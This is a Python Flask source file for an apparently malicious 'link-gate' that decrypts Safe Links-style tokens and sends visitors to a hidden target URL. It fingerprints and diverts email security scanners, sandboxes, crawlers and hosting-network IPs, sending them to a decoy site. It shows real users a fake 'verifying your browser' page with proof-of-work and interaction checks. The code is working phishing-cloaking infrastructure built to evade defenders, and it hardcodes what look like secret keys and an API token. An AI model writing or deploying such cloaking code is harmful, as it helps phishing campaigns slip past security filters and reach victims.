import os
import time
import json
import hmac
import hashlib
import secrets
import base64
import logging
from ipaddress import ip_address, ip_network
from urllib.parse import quote

import httpx
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from flask import (
    Flask, request, redirect, render_template_string,
    make_response, jsonify,
)
from itsdangerous import URLSafeTimedSerializer

# ---------------------------------------------------------------------------
# config
# ---------------------------------------------------------------------------
SK = os.environ.get("SECRET_KEY", "7b311b50f8306ae1fbe13f4db9b030267f77f3cc0020889b8cb583895afb443e")
AES_KEY_HEX = os.environ.get("AES_KEY_HEX", "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef")
AES_KEY = bytes.fromhex(AES_KEY_HEX)

GATE_TTL = int(os.environ.get("GATE_TTL_SECONDS", "900"))
UNWANTED_REDIRECT_URL = os.environ.get("UNWANTED_REDIRECT_URL", "https://www.xfinity.com")
IPINFO_TOKEN = os.environ.get("IPINFO_TOKEN", "d7fa589dab1942")

app = Flask(__name__)
app.secret_key = SK.encode()
cookie_serializer = URLSafeTimedSerializer(app.secret_key, salt="cookie-gate")

logging.basicConfig(level=logging.INFO)
log = logging.getLogger("link-gate")

# ---------------------------------------------------------------------------
# scanner networks & UAs
# ---------------------------------------------------------------------------
EOP = [
    ip_network("40.92.0.0/15"), ip_network("40.107.0.0/16"),
    ip_network("52.100.0.0/14"), ip_network("104.47.0.0/17"),
    ip_network("13.107.6.152/31"), ip_network("13.107.18.10/31"),
    ip_network("13.107.128.0/22"), ip_network("23.103.160.0/20"),
]
SCANNER_NETS = {"microsoft_eop": EOP}

SCANNER_UA_TOKENS = (
    "microsoft office", "safelinks", "microsoft preview", "proofpoint", "pp-url", 
    "mimecast", "barracuda", "talos", "ironport", "forcepoint", "symantec", 
    "messagelabs", "trendmicro", "trend micro", "kaspersky", "sophos", "fireeye", 
    "mandiant", "abnormal security", "avanan", "ironscales", "cloudmark", "agari", 
    "valimail", "hornetsecurity", "spamhaus", "zerospam", "retarus", "vade",
    "urlscan", "urlscan.io", "virustotal", "any.run", "hybrid-analysis",
    "joesandbox", "joe sandbox", "cuckoo", "triage", "hatching",
    "intezer", "cape sandbox", "reverse.it", "filescan.io", "urlquery",
    "headlesschrome", "headless", "phantomjs", "puppeteer", "playwright", 
    "selenium", "webdriver", "nightmare", "electron",
    "googlebot", "google-safety", "bingpreview", "bingbot", "duckduckbot",
    "yandexbot", "baiduspider", "slackbot", "twitterbot", "facebookexternalhit",
    "linkedinbot", "discordbot", "telegrambot", "whatsapp", "skypeuripreview",
    "applebot", "pinterestbot", "embedly", "quora link preview", "outbrain",
    "nuzzel", "vk share", "w3c_validator",
    "curl/", "wget/", "python-requests", "python-urllib", "go-http-client",
    "java/", "okhttp", "axios/", "node-fetch", "undici", "libwww-perl",
    "masscan", "nmap", "zgrab", "nuclei", "nikto", "sqlmap",
    "lighthouse", "pagespeed", "gtmetrix", "pingdom", "uptimerobot",
    "statuscake", "site24x7", "newrelic", "datadog synthetics",
)

HOSTING_ASNS = {
    "AS16509", "AS14618", "AS8075", "AS8068", "AS15169", "AS396982",
    "AS14061", "AS16276", "AS24940", "AS63949", "AS13335", "AS20940",
    "AS54113", "AS45102", "AS45090", "AS4134", "AS714", "AS6185",
    "AS55286", "AS40676", "AS36352", "AS51167", "AS8560", "AS26496",
    "AS32244", "AS26347", "AS3223", "AS20021", "AS4213", "AS29802",
    "AS36351", "AS33070", "AS20473", "AS20326", "AS62240", "AS62597",
    "AS3356", "AS9009", "AS265454", "AS174", "AS30058", "AS8100", 
    "AS12876", "AS20940", "AS30633", "AS60781", "AS396356", "AS22612", 
    "AS35916", "AS19527", "AS396073"
}

HOSTING_KEYWORDS = (
    "AMAZON", "AWS", "GOOGLE", "MICROSOFT", "AZURE", "DIGITALOCEAN", "OVH", 
    "HETZNER", "LINODE", "CLOUDFLARE", "FASTLY", "AKAMAI", "ALIBABA", "TENCENT",
    "PROOFPOINT", "MIMECAST", "BARRACUDA", "ZSCALER", "FORCEPOINT", "IRONPORT",
    "SOPHOS", "KASPERSKY", "TREND", "SYMANTEC", "VADE", "RETARUS", "HORNET",
    "KRYPT", "CHOOPA", "COLOCROSSING", "CONTABO", "VULTR", "GODADDY", "NAMECHEAP",
    "IONOS", "HOSTGATOR", "BLUEHOST", "LIQUIDWEB", "RACKSPACE", "SOFTLAYER",
    "ORACLE", "IBM", "M247", "DATAWAGON", "SCALEWAY", "UPCLOUD", "HOSTING",
    "ABNORMAL", "AVANAN", "IRONSCALES", "CISCO", "TALOS"
)

def client_ip() -> str:
    xff = request.headers.get("X-Forwarded-For", "")
    return xff.split(",")[0].strip() if xff else request.remote_addr or ""

def check_ipinfo(ip: str) -> dict:
    if ip.startswith(("127.", "192.168.", "10.", "172.")):
        return {}
    try:
        url = f"https://ipinfo.io/{ip}/json?token={IPINFO_TOKEN}"
        r = httpx.get(url, timeout=3.0)
        if r.status_code == 200:
            return r.json()
    except Exception as e:
        log.error(json.dumps({"event": "ipinfo_error", "ip": ip, "err": str(e)}))
    return {}

def classify(ip: str, ua: str) -> dict:
    out = {"ip": ip, "ua": ua, "scanner": False, "source": None, "method": None}
    low = ua.lower()
    
    for tok in SCANNER_UA_TOKENS:
        if tok in low:
            out["scanner"] = True
            out["source"] = tok
            out["method"] = "ua"
            return out

    try:
        addr = ip_address(ip)
        for name, nets in SCANNER_NETS.items():
            if any(addr in n for n in nets):
                out["scanner"] = True
                out["source"] = name
                out["method"] = "ip_static"
                return out
    except ValueError:
        pass

    info = check_ipinfo(ip)
    org = info.get("org", "").upper()
    
    if org:
        asn = org.split(" ")[0]
        if asn in HOSTING_ASNS:
            out["scanner"] = True
            out["source"] = f"asn:{asn}"
            out["method"] = "asn"
            return out
            
        for kw in HOSTING_KEYWORDS:
            if kw in org:
                out["scanner"] = True
                out["source"] = kw
                out["method"] = "asn_keyword"
                return out

    return out

def unseal_payload(blob):
    if not blob.startswith("u001."): return None
    try:
        blob = blob.rstrip("/")
        core = blob[5:].replace("-3D-3D", "")
        clean = core.replace("-2F", "").replace("-3D", "").replace("-3A", "").replace("-2B", "")
        parts = clean.split(".", 1)
        if len(parts) < 2:
            return None
        b64_ciphertext = parts[1]
        padding = '=' * (-len(b64_ciphertext) % 4)
        raw_bytes = base64.urlsafe_b64decode(b64_ciphertext + padding)
        nonce = raw_bytes[:12]
        ciphertext = raw_bytes[12:]
        aesgcm = AESGCM(AES_KEY)
        plaintext = aesgcm.decrypt(nonce, ciphertext, None)
        return json.loads(plaintext.decode('utf-8'))
    except Exception as e:
        log.error(f"Failed to decrypt payload: {e}")
        return None

def _static_page(title: str, text: str, status_code: int):
    html = f"<html><body><h1>{title}</h1><p>{text}</p></body></html>"
    return make_response(html, status_code)

LANDING = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Please wait...</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #ffffff; color: #333; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
        .card { text-align: center; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h1 { font-size: 18px; font-weight: 500; color: #555; }
        .hp-field { position: absolute; left: -9999px; top: -9999px; opacity: 0; height: 0; width: 0; z-index: -1; }
    </style>
</head>
<body>
    <div class="card">
        <div class="spinner"></div>
        <h1>Verifying your browser...</h1>
    </div>
    
    <form id="challenge-form" method="POST" action="{{ action }}" style="display:none;">
        <input type="text" name="email_confirm_hp" id="email_confirm_hp" class="hp-field" autocomplete="off" tabindex="-1" aria-hidden="true">
        <input type="hidden" name="n" value="{{ nonce }}">
        <input type="hidden" name="t" value="{{ token }}">
        <input type="hidden" name="challenge" value="{{ challenge }}">
        <input type="hidden" name="pow_nonce" id="pow_nonce" value="">
        <input type="hidden" name="user_interacted" id="user_interacted" value="false">
    </form>

    <script>
        let interacted = false;
        function markInteraction() {
            if (!interacted) {
                interacted = true;
                document.getElementById('user_interacted').value = 'true';
            }
        }

        document.addEventListener('mousemove', markInteraction);
        document.addEventListener('touchstart', markInteraction, {passive: true});
        document.addEventListener('touchmove', markInteraction, {passive: true});

        async function solveChallenge() {
            const seed = "{{ challenge }}";
            let nonce = 0; let hash = "";
            while (!hash.startsWith("0000")) {
                nonce++;
                const data = new TextEncoder().encode(seed + nonce);
                const hashBuffer = await crypto.subtle.digest("SHA-256", data);
                const hashArray = Array.from(new Uint8Array(hashBuffer));
                hash = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
            }
            document.getElementById("pow_nonce").value = nonce;
            
            setTimeout(() => { 
                document.getElementById("challenge-form").submit(); 
            }, 9000);
        }
        window.onload = solveChallenge;
    </script>
</body>
</html>"""

@app.route("/health", methods=["GET"])
def health():
    return jsonify({"ok": True})

@app.route("/", methods=["GET"])
def root():
    return _static_page("Not found", "Nothing here.", 404)

@app.route("/ls/<path:token>", methods=["GET"])
def landing(token: str):
    if not token.startswith("click_upn="):
        return _static_page("Invalid link", "This link is not valid.", 404)
        
    eop_token = token.replace("click_upn=", "")
    data = unseal_payload(eop_token)
    
    if not data or "target" not in data:
        return _static_page("Invalid link", "Could not decrypt target.", 404)

    # Use the unwanted URL from the payload, fallback to env var
    unwanted = data.get("unwanted", UNWANTED_REDIRECT_URL)

    tag = classify(client_ip(), request.headers.get("User-Agent", ""))
    log.info(json.dumps({"event": "landing_get", **tag}))

    if tag["scanner"]:
        return redirect(unwanted, code=302)

    challenge_seed = secrets.token_hex(16)
    nonce_payload = {"t": eop_token, "ts": time.time(), "challenge": challenge_seed}
    nonce_blob = cookie_serializer.dumps(nonce_payload)

    html = render_template_string(
        LANDING, action=f"/submit/{quote(eop_token)}", token=eop_token,
        nonce=nonce_blob, challenge=challenge_seed,
    )
    resp = make_response(html)
    
    is_https = (request.headers.get("X-Forwarded-Proto", "http") == "https" or request.is_secure)
    resp.set_cookie("gate_session", nonce_blob, max_age=GATE_TTL, httponly=True, secure=is_https, samesite="None", path="/")
    return resp

@app.route("/submit/<path:token>", methods=["POST"])
def execute(token: str):
    # Decrypt payload early to get the specific unwanted URL for this link
    data = unseal_payload(token)
    if not data or "target" not in data:
        # If it fails to decrypt, use the default env var
        return redirect(UNWANTED_REDIRECT_URL, code=302)
        
    unwanted = data.get("unwanted", UNWANTED_REDIRECT_URL)

    tag = classify(client_ip(), request.headers.get("User-Agent", ""))
    
    if tag["scanner"]:
        return redirect(unwanted, code=302)

    if request.form.get("email_confirm_hp"):
        return redirect(unwanted, code=302)
        
    if request.form.get("user_interacted") != "true":
        return redirect(unwanted, code=302)

    cookie_val = request.cookies.get("gate_session", "")
    if not cookie_val:
        return redirect(unwanted, code=302)

    try:
        nonce_data = cookie_serializer.loads(cookie_val, max_age=GATE_TTL)
    except Exception:
        return redirect(unwanted, code=302)

    if not hmac.compare_digest(nonce_data.get("t", ""), token):
        return redirect(unwanted, code=302)

    submitted_pow = request.form.get("pow_nonce", "")
    seed = nonce_data.get("challenge", "")
    
    if not seed or not submitted_pow:
        return redirect(unwanted, code=302)
        
    test_hash = hashlib.sha256((seed + submitted_pow).encode()).hexdigest()
    if not test_hash.startswith("0000"):
        return redirect(unwanted, code=302)

    resp = make_response(redirect(data["target"], code=303))
    resp.delete_cookie("gate_session", path="/")
    return resp

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000, debug=True)
